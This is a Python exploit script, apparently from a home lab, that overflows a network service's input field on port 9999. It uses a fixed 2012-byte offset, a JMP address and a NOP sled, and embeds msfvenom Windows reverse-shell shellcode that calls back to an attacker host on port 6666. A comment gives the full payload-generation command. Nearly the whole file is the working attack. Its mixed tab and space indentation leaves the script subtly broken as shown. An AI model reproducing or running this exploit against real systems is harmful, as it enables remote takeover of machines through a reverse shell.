import socket, time, sys

ip = "192.168.1.103"
port = 9999
timeout = 5

string = "A" * 2012 # exact offset
string += "\xdf\x14\x50\x62" # JMP Address 625014DF
string += "\x90" * 16 # NOP sled

# Shellcode (msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=6666 -b '\x00' -f py -a x86 --platform Windows)
# PAY ATTENTION: sometime you need to add EXITFUNC=thread to msfvenom command otherwise shellcode will not works correctly
buf =  b""
buf += b"\xb8\xd0\x83\xdd\x66\xd9\xc0\xd9\x74\x24\xf4\x5d"
buf += b"\x29\xc9\xb1\x52\x31\x45\x12\x83\xed\xfc\x03\x95"
buf += b"\x8d\x3f\x93\xe9\x7a\x3d\x5c\x11\x7b\x22\xd4\xf4"
buf += b"\x4a\x62\x82\x7d\xfc\x52\xc0\xd3\xf1\x19\x84\xc7"
buf += b"\x82\x6c\x01\xe8\x23\xda\x77\xc7\xb4\x77\x4b\x46"
buf += b"\x37\x8a\x98\xa8\x06\x45\xed\xa9\x4f\xb8\x1c\xfb"
buf += b"\x18\xb6\xb3\xeb\x2d\x82\x0f\x80\x7e\x02\x08\x75"
buf += b"\x36\x25\x39\x28\x4c\x7c\x99\xcb\x81\xf4\x90\xd3"
buf += b"\xc6\x31\x6a\x68\x3c\xcd\x6d\xb8\x0c\x2e\xc1\x85"
buf += b"\xa0\xdd\x1b\xc2\x07\x3e\x6e\x3a\x74\xc3\x69\xf9"
buf += b"\x06\x1f\xff\x19\xa0\xd4\xa7\xc5\x50\x38\x31\x8e"
buf += b"\x5f\xf5\x35\xc8\x43\x08\x99\x63\x7f\x81\x1c\xa3"
buf += b"\x09\xd1\x3a\x67\x51\x81\x23\x3e\x3f\x64\x5b\x20"
buf += b"\xe0\xd9\xf9\x2b\x0d\x0d\x70\x76\x5a\xe2\xb9\x88"
buf += b"\x9a\x6c\xc9\xfb\xa8\x33\x61\x93\x80\xbc\xaf\x64"
buf += b"\xe6\x96\x08\xfa\x19\x19\x69\xd3\xdd\x4d\x39\x4b"
buf += b"\xf7\xed\xd2\x8b\xf8\x3b\x74\xdb\x56\x94\x35\x8b"
buf += b"\x16\x44\xde\xc1\x98\xbb\xfe\xea\x72\xd4\x95\x11"
buf += b"\x15\x1b\xc1\x18\x80\xf3\x10\x1a\x50\x0e\x9c\xfc"
buf += b"\x0e\x1e\xc8\x57\xa7\x87\x51\x23\x56\x47\x4c\x4e"
buf += b"\x58\xc3\x63\xaf\x17\x24\x09\xa3\xc0\xc4\x44\x99"
buf += b"\x47\xda\x72\xb5\x04\x49\x19\x45\x42\x72\xb6\x12"
buf += b"\x03\x44\xcf\xf6\xb9\xff\x79\xe4\x43\x99\x42\xac"
buf += b"\x9f\x5a\x4c\x2d\x6d\xe6\x6a\x3d\xab\xe7\x36\x69"
buf += b"\x63\xbe\xe0\xc7\xc5\x68\x43\xb1\x9f\xc7\x0d\x55"
buf += b"\x59\x24\x8e\x23\x66\x61\x78\xcb\xd7\xdc\x3d\xf4"
buf += b"\xd8\x88\xc9\x8d\x04\x29\x35\x44\x8d\x59\x7c\xc4"
buf += b"\xa4\xf1\xd9\x9d\xf4\x9f\xd9\x48\x3a\xa6\x59\x78"
buf += b"\xc3\x5d\x41\x09\xc6\x1a\xc5\xe2\xba\x33\xa0\x04"
buf += b"\x68\x33\xe1"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("Christopher" + "\r\n")  # Send the username (username field is not vulnerable to bof)
        s.recv(1024)
        s.send(string + buf + '\r\n')
        s.recv(1024)
        s.close()
except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
